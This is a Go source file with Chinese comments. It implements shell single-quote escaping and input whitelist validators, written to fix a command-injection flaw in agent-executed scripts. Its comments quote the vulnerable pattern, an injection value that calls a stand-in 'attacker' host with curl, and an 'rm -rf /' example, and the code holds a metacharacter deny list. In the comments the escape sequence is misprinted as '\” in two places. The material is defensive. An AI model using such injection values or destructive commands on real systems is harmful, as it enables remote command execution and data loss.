// Package shellquote 为「把外部输入拼进 shell 单引号串」提供单一转义实现。
//
// # 为什么要有这个包
//
// 控制面大量 handler 用 fmt.Sprintf 把请求体字段直接拼进要下发到 agent 的
// shell 脚本，未做任何转义。例如（docs/opsmesh-authz-audit-2026-11-04.md 附带发现）：
//
//	script = fmt.Sprintf(`echo "%s=%s" >> users.properties`, req.User, req.Password)
//
// 请求体传 user = `x"; curl -s http://attacker/... ; echo "` 即可闭合双引号并注入
// 任意命令。该脚本最终由 agent 以 `sh -c` 执行（internal/agent/agent.go 的
// exec.Command("sh","-c",command)），注入即命令执行。
//
// 放在 pkg/ 而非 internal/：services/ 下多个微服务模块同样存在该形态（同一份
// 判据不该有 N 份实现），pkg/ 是各模块唯一合法的共享层（见 pkg/sqlguard 先例）。
//
// # 用法
//
// 首选 Quote 得到可安全拼接的单引号串：
//
//	fmt.Sprintf("echo %s >> f", shellquote.Quote(req.User))  // 永远安全
//
// 只允许窄字符集时用 ValidateIdent / ValidatePort 之类白名单，比转义更严。
//
// # 为什么不是简单 strings.ReplaceAll 转义
//
// shell 的单引号语义是「内部一切字面」，唯一无法表示的是单引号本身，标准解法是
// 关闭-转义-重开：' → '\”。任何"把单引号删掉/换成别的"的做法都会改变原义，
// 看着安全实则静默改数据。本包只提供这一条已证语义，不提供别的快捷方式。
package shellquote

import (
	"fmt"
	"strconv"
	"strings"
)

// constSingleQuote 是 shell 单引号字面量的长度（含两端引号）。
const constSingleQuote = 2

// Quote 把任意字符串转成 shell 单引号安全字面量。
//
// 语义保证：返回值的 shell 词法求值结果恒等于原字符串的**字面字节序列**，
// 不含任何可执行结构（因此不可能因注入产生额外命令、管道、重定向）。
//
// 实现：把字符串中的每个 ' 换成 '\”（关闭当前单引号、插入一个转义单引号、
// 重开单引号）。这是 POSIX shell 唯一正确的通用解法。
//
// 例：Quote(`a'; rm -rf /`) 返回 'a'\”; rm -rf /'——shell 求值后得到原字符串本体。
func Quote(s string) string {
	if s == "" {
		return "''"
	}
	// 快速路径：无单引号时直接包一层，省掉替换开销（多数 hostname/version 走这条）。
	if !strings.Contains(s, "'") {
		return "'" + s + "'"
	}
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// QuoteJoin 把若干参数转义后用 sep 连接，用于拼 argv。
func QuoteJoin(sep string, args ...string) string {
	if len(args) == 0 {
		return ""
	}
	parts := make([]string, len(args))
	for i, a := range args {
		parts[i] = Quote(a)
	}
	return strings.Join(parts, sep)
}

// ---------------------------------------------------------------- 白名单校验
//
// 白名单比转义更严：当字段的合法域已知且窄（hostname、版本号、端口）时，
// 直接用白名单把一切意外输入挡在门外，比"允许任意串但转义"更安全，
// 且错误信息能点名"哪个字段不合法"，便于运维定位。

// ValidateHost 校验主机名 / IPv4。允许单标签（localhost）与多级域名；
// 不接受 IPv6（含 ':'，agent 端 ssh 目标目前不用）。
func ValidateHost(s string) error {
	if s == "" {
		return fmt.Errorf("host is empty")
	}
	if len(s) > 253 {
		return fmt.Errorf("host too long (%d > 253)", len(s))
	}
	for _, lbl := range strings.Split(s, ".") {
		if lbl == "" || len(lbl) > 63 {
			return fmt.Errorf("invalid host %q: label %q invalid", s, lbl)
		}
		if !isAlnumDash(lbl) {
			return fmt.Errorf("invalid host %q: label %q has illegal chars", s, lbl)
		}
		if lbl[0] == '-' || lbl[len(lbl)-1] == '-' {
			return fmt.Errorf("invalid host %q: label %q starts/ends with '-'", s, lbl)
		}
	}
	return nil
}

// ValidateIdent 校验 shell/系统标识符（用户名、组名等）。POSIX 便携集：
// 字母数字下划线点，不以 '-' 开头，长度 ≤ 32（与 useradd 的常见上限一致）。
func ValidateIdent(s string) error {
	if s == "" {
		return fmt.Errorf("identifier is empty")
	}
	if len(s) > 32 {
		return fmt.Errorf("identifier too long (%d > 32)", len(s))
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9':
		case c == '_' || c == '.':
		case c == '-' && i > 0:
		default:
			return fmt.Errorf("invalid identifier %q: char %q not allowed", s, string(c))
		}
	}
	return nil
}

// ValidatePort 校验 TCP 端口（1-65535）。
func ValidatePort(p int) error {
	if p < 1 || p > 65535 {
		return fmt.Errorf("port %d out of range 1-65535", p)
	}
	return nil
}

// ParsePort 解析并校验端口字符串（CLI/JSON 普遍以字符串传端口）。
func ParsePort(s string) (int, error) {
	if s == "" {
		return 0, fmt.Errorf("port is empty")
	}
	n, err := strconv.Atoi(s)
	if err != nil {
		return 0, fmt.Errorf("port %q is not a number", s)
	}
	if err := ValidatePort(n); err != nil {
		return 0, err
	}
	return n, nil
}

// ValidatePath 校验**绝对**路径，且不含 shell 元字符与 .. 穿越。
// 用于 backupDir / file 一类会直接拼进命令的路径字段。
func ValidatePath(p string) error {
	if p == "" {
		return fmt.Errorf("path is empty")
	}
	if !strings.HasPrefix(p, "/") {
		return fmt.Errorf("path %q is not absolute", p)
	}
	if len(p) > 4096 {
		return fmt.Errorf("path too long (%d > 4096)", len(p))
	}
	for _, seg := range strings.Split(p, "/") {
		if seg == ".." {
			return fmt.Errorf("path %q contains '..'", p)
		}
	}
	for i := 0; i < len(p); i++ {
		if strings.IndexByte(" \t\n\r'\"\\$`;&|<>()*?[]{}!~#", p[i]) >= 0 {
			return fmt.Errorf("path %q contains shell metachar %q", p, string(p[i]))
		}
	}
	return nil
}

func isAlnumDash(s string) bool {
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9', c == '-':
		default:
			return false
		}
	}
	return true
}
